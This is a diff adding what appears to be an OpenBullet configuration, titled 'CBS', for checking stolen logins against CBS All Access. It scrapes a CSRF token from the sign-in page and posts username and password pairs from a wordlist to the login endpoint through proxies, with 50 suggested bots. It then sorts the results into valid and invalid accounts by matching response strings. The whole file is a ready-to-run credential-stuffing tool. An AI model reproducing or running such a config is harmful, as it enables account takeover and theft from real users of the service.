@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "CBS",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-04T16:28:12.5190529+05:00",
+  "AdditionalInfo": "",
+  "Author": "MadmanDev",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.cbs.com/all-access/user/signin/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+PARSE "<SOURCE>" LR "name=\"tk_trp\" value=\"" "\" />" -> VAR "tk1" 
+FUNCTION URLEncode "<tk1>" -> VAR "tk" 
+REQUEST POST "https://www.cbs.com/account/login/" 
+  CONTENT "j_username=<USER>&j_password=<PASS>&_remember_me=1&tk_trp=<tk>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email and\/or password" 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
